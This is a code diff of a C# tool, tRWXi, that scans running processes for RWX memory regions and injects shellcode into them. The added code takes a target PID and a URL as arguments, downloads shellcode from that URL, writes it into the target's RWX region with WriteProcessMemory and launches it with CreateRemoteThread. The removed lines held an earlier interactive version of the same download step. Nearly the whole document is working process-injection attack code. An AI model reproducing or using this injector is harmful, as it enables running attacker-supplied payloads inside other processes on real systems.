@@ -1,10 +1,8 @@
 ﻿using System;
-using System.Diagnostics;
 using System.Runtime.ConstrainedExecution;
 using System.Runtime.InteropServices;
 using System.Security;
 using System.Collections.Generic;
-using System.Linq.Expressions;
 using System.IO;
 using System.Text;
 
@@ -75,10 +73,10 @@ namespace tRWXi
 
         public static void Main(string[] args)
         {
-            Console.WriteLine("[!] Started enumeration");
-
             try
             {
+                Dictionary<string, string> parameters = Utils.ArgParser.parse(args); 
+
                 PROCESSENTRY32 pe = new PROCESSENTRY32();
                 pe.dwSize = (uint)Marshal.SizeOf(pe);
 
@@ -92,6 +90,10 @@ namespace tRWXi
 
                 Dictionary<int, string> processes = new Dictionary<int, string>();
 
+                IntPtr nbw = IntPtr.Zero;
+
+                Console.WriteLine("[!] Started enumeration");
+
                 while (hResult)
                 {
                     IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, (int) pe.th32ProcessID);
@@ -100,10 +102,22 @@ namespace tRWXi
                         lpAddress = new IntPtr (mbi.BaseAddress.ToInt64() + mbi.RegionSize.ToInt64());
                         if (mbi.AllocationProtect == PAGE_EXECUTE_READ_WRITE && mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE) 
                         {
-                            Console.WriteLine("M: " + mbi.BaseAddress.ToString());
                             if (!processes.ContainsKey((int)pe.th32ProcessID))
                             {
-                                processes.Add((int) pe.th32ProcessID, pe.szExeFile);
+                                processes.Add((int)pe.th32ProcessID, pe.szExeFile);
+
+                                if (parameters.ContainsKey("pid") && parameters.ContainsKey("url"))
+                                {
+                                    if (Convert.ToInt32(parameters["pid"]) == (int)pe.th32ProcessID)
+                                    {
+                                        Console.WriteLine("[!] Started injection");
+                                        string url = parameters["url"];
+                                        byte[] shellcode = Utils.Shellcoder.fetch(url);
+                                        WriteProcessMemory(hProcess, mbi.BaseAddress, shellcode, shellcode.Length, out nbw);
+                                        Console.WriteLine("Written " + nbw.ToString() + " bytes into RWX region");
+                                        CreateRemoteThread(hProcess, IntPtr.Zero, 0, mbi.BaseAddress, IntPtr.Zero, 0, IntPtr.Zero);
+                                    }
+                                }
                             }
                         }
                     }
@@ -112,22 +126,10 @@ namespace tRWXi
                     lpAddress = IntPtr.Zero;
                 }
                 CloseHandle(hSnapshot);
-                foreach(KeyValuePair<int, string> pair in processes)
+                foreach (KeyValuePair<int, string> pair in processes)
                 {
                     Console.WriteLine(String.Format("[+] Found RWX regions in PID: {0} -> {1}", pair.Key, pair.Value));
                 }
-
-                Console.Write("Provide a PID to inject your shellcode into >:");
-                int pid = (int) Int64.Parse(Console.ReadLine());
-                Console.Write("> Provide an URL to download the shellcode from >:");
-                string url = Console.ReadLine();
-                System.Net.WebClient client = new System.Net.WebClient();
-                Stream str = client.OpenRead(url);
-                StreamReader reader = new StreamReader(str);
-                string data = reader.ReadToEnd();
-                byte[] shellcode = Encoding.ASCII.GetBytes(data);
-                Console.WriteLine(shellcode.ToString());
-                //WriteProcessMemory(OpenProcess(PROCESS_ALL_ACCESS, false, pid), );
 
             }
             catch (Exception ex)
